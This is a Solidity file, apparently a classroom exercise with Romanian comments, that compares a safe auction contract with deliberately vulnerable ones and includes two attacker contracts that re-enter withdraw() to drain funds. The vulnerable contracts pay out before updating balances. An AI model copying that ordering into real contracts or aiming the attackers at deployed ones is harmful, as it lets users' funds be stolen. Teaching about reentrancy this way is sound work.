// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.28;

contract SecureAuction {

    mapping(address => uint256) public bids;
    mapping(address => uint256) public pendingReturns;
    address public highestBidder;
    uint256 public highestBid;
    bool public auctionEnded;

    event BidPlaced(address indexed bidder, uint256 amount);
    event AuctionEnded(address winner, uint256 amount);
    event Withdrawal(address indexed bidder, uint256 amount);

    function placeBid() external payable {
        require(!auctionEnded, "Auction already ended");
        require(msg.value > 0, "Bid must be greater than 0");

        bids[msg.sender] += msg.value;

        if (bids[msg.sender] > highestBid) {
            highestBidder = msg.sender;
            highestBid = bids[msg.sender];
        }

        emit BidPlaced(msg.sender, msg.value);
    }

    function endAuction() external {
        require(!auctionEnded, "Auction already ended");
        require(highestBidder != address(0), "No bids placed");

        auctionEnded = true;

        emit AuctionEnded(highestBidder, highestBid);
    }

    function withdraw() external {
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender != highestBidder, "Winner cannot withdraw");

        uint256 refundAmount = bids[msg.sender];
        require(refundAmount > 0, "No funds to withdraw");
        bids[msg.sender] = 0;
        (bool success,) = msg.sender.call{value: refundAmount}("");

        require(success, "Withdrawal failed");

        emit Withdrawal(msg.sender, refundAmount);
    }

    function claimPrize() external {
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender == highestBidder, "Only winner can claim");
        require(highestBid > 0, "Already claimed");

        uint256 prizeAmount = highestBid;
        highestBid = 0; // Prevent re-entrancy

        (bool success,) = msg.sender.call{value: prizeAmount}("");
        require(success, "Prize claim failed");
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract VulnerableAuction {
    mapping(address => uint256) public bids;
    mapping(address => uint256) public pendingReturns;
    address public highestBidder;
    uint256 public highestBid;
    bool public auctionEnded;
    bool transient locked;

    error ReentrantCall();

    modifier nonReentrant() {
        if (locked) revert ReentrantCall();
        locked = true;
        _;
        locked = false;
    }

    event BidPlaced(address indexed bidder, uint256 amount);
    event AuctionEnded(address winner, uint256 amount);
    event Withdrawal(address indexed bidder, uint256 amount);

    function placeBid() external payable {
        require(!auctionEnded, "Auction already ended");
        require(msg.value > 0, "Bid must be greater than 0");

        bids[msg.sender] += msg.value;

        if (bids[msg.sender] > highestBid) {
            highestBidder = msg.sender;
            highestBid = bids[msg.sender];
        }

        emit BidPlaced(msg.sender, msg.value);
    }

    function endAuction() external {
        require(!auctionEnded, "Auction already ended");
        require(highestBidder != address(0), "No bids placed");

        auctionEnded = true;

        emit AuctionEnded(highestBidder, highestBid);
    }

    function withdraw() external nonReentrant {
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender != highestBidder, "Winner cannot withdraw");

        uint256 refundAmount = bids[msg.sender];
        require(refundAmount > 0, "No funds to withdraw");

        (bool success,) = msg.sender.call{value: refundAmount}("");
        bids[msg.sender] = 0;
        require(success, "Withdrawal failed");

        emit Withdrawal(msg.sender, refundAmount);
    }

    function claimPrize() external nonReentrant {
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender == highestBidder, "Only winner can claim");
        require(highestBid > 0, "Already claimed");

        uint256 prizeAmount = highestBid;

        (bool success,) = msg.sender.call{value: prizeAmount}("");
        highestBid = 0; // Prevent re-entrancy
        require(success, "Prize claim failed");
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function bidInfo(address sender) external view returns (uint256) {
        return bids[sender];
    }
}

// 2.1: Varianta cu transfer si ordinea vulnerabila a operatiilor
contract TransferAuction {
    mapping(address => uint256) public bids;
    address public highestBidder;
    uint256 public highestBid;
    bool public auctionEnded;

    function placeBid() external payable {
        require(!auctionEnded, "Auction already ended");
        require(msg.value > 0, "Bid must be greater than 0");

        bids[msg.sender] += msg.value;
        if (bids[msg.sender] > highestBid) {
            highestBidder = msg.sender;
            highestBid = bids[msg.sender];
        }
    }

    function endAuction() external {
        require(!auctionEnded, "Auction already ended");
        require(highestBidder != address(0), "No bids placed");
        auctionEnded = true;
    }

    function withdraw() external {
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender != highestBidder, "Winner cannot withdraw");

        uint256 refundAmount = bids[msg.sender];
        require(refundAmount > 0, "No funds to withdraw");

        payable(msg.sender).transfer(refundAmount);
        bids[msg.sender] = 0;
    }
}

// 2.1: Atacator cu fallback pentru a demonstra limita de 2300 gas a transfer
contract TransferAttacker {
    address public immutable auction;

    constructor(address auctionAddress) {
        auction = auctionAddress;
    }

    function bid() external payable {
        (bool success,) = auction.call{value: msg.value}(abi.encodeWithSignature("placeBid()"));
        require(success);
    }

    function attack() external {
        (bool success,) = auction.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Attack failed");
    }

    fallback() external payable {
        if (msg.value > 0) {
            (bool success,) = auction.call(abi.encodeWithSignature("withdraw()"));
            require(success);
        }
    }
}

interface IAuction {
    function bidInfo(address) external returns (uint256);
}

contract Attacker {
    IAuction auction;

    constructor(address auctionAddress) {
        auction = IAuction(auctionAddress);
    }

    function bid() external payable {
        (bool success,) = address(auction).call{value: msg.value}(abi.encodeWithSignature("placeBid()"));
        require(success);
    }

    function attack() external payable {
        (bool success,) = address(auction).call(abi.encodeWithSignature("withdraw()"));
        require(success, "Attack failed");
    }

    // 1.4: receive preia transferurile cu calldata gol, deci fallback-ul nu mai re-intra
    receive() external payable {}

    fallback() external payable {
        if (msg.value > 0) {
            uint256 bidInfo = auction.bidInfo(address(this));
            uint256 getBackValue = bidInfo / 5;
            if (address(auction).balance >= getBackValue) {
                (bool success,) = address(auction).call(abi.encodeWithSignature("withdraw()"));
                require(success);
            }
        }
    }
}
